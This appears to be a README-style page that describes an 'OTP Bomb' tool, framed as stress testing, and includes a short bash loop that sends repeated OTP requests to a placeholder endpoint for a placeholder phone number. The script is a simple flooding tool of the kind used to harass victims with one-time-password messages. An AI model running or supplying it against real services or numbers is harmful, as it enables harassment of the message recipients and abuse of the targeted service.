## OTP Bomb

### Overview

An **OTP Bomb** is a tool designed to generate and send a high volume of OTP (One-Time Password) requests to a specified target. This is generally used for testing purposes, such as stress testing systems to evaluate their resilience and handling of multiple OTP requests. It is crucial to note that using an OTP bomb for unauthorized purposes or in a way that disrupts services is illegal and unethical.

### Purpose

The OTP Bomb tool is primarily used in scenarios where:
- **Stress Testing**: To test how well a system can handle a large number of OTP requests.
- **Security Testing**: To evaluate the robustness of OTP systems and their response to high-volume attacks.
- **Development**: For developers to simulate scenarios involving multiple OTP requests to test their applications.

### How It Works

1. **Setup**: Configure the OTP Bomb with the target system's endpoint that handles OTP requests.
2. **Input**: Provide necessary details such as phone number or email address where OTPs will be sent.
3. **Execution**: The tool starts sending multiple OTP requests at a specified interval.
4. **Monitoring**: Monitor the responses to understand how the target system handles the load.

### Example Usage

Hereâ€™s a simplified example of how an OTP Bomb might be used in a controlled environment:

```bash
#!/bin/bash

# Example script for sending OTP requests

# Target URL and phone number
TARGET_URL="http://example.com/otp"
PHONE_NUMBER="1234567890"

# Number of requests and interval
NUM_REQUESTS=100
INTERVAL=5

for ((i=1; i<=NUM_REQUESTS; i++)); do
  curl "${TARGET_URL}?number=${PHONE_NUMBER}" > /dev/null
  echo "Request $i sent. Waiting for $INTERVAL seconds..."
  sleep "$INTERVAL"
done
